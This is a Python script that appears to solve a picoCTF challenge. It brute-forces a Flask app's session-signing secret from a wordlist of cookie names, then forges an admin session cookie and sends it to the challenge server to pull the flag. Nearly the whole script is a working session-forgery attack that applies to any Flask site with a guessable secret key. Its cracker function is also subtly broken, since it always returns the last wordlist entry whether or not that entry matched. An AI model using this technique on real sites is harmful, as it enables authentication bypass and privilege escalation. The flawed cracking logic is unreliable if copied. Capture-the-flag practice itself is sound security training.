from itsdangerous import base64_decode, URLSafeTimedSerializer, BadSignature, TimestampSigner
import hashlib
from flask.json.tag import TaggedJSONSerializer
import requests

def get_serializer(secret: str) -> URLSafeTimedSerializer:
    """
    Get a (cached) serializer instance
    :param secret: Secret key
    :param salt: Salt
    :param legacy: Should the legacy timestamp generator be used?
    :return: Flask session serializer
    """
    salt = 'cookie-session'
    return URLSafeTimedSerializer(
        secret_key=secret,
        salt=salt,
        serializer=TaggedJSONSerializer(),
        signer=TimestampSigner,
        signer_kwargs={
            'key_derivation': 'hmac',
            'digest_method': hashlib.sha1})

def cracker(cookie):
    cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
    for secret in cookie_names:
        try:
            serializer = get_serializer(secret).loads(cookie)
        except BadSignature:
            continue
    

    return secret

def callAPI(cookie):
    r = requests.get("http://mercury.picoctf.net:35697/display", cookies={"session": cookie}, allow_redirects=False)
    if "picoCTF" in r.text:
        print(r.text)


# secret = cracker('eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZI4JTA.wBuZPb26a8NU0yetOTStU12l2ec')
# print('secret is: ', secret)
cookie = get_serializer('peanut butter').dumps({'very_auth':'admin'})
print(cookie)
callAPI(cookie)